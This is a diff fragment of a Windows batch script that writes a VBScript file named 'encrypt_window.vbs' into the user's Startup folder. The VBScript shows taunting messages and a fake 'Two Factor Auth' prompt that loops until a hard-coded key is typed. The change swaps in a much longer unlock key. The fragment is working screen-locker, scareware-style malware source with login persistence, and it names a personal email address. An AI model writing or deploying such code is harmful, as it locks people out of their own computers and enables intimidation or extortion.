@@ -28,7 +28,7 @@ echo MsgBox"Tipo jo?" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startu
 echo MsgBox"Plaki Plaki?" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 echo Do >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 echo key = InputBox ("Two Factor Auth Please enter code that sent to ArturasZemaitinis256@gmail.com") >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
-echo Loop Until key = "807113456" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
+echo Loop Until key = "887586097974535948084564972659" >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 echo. >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 echo MsgBox"Nu ka..." >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
 echo MsgBox"Jopta..." >> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\encrypt_window.vbs"
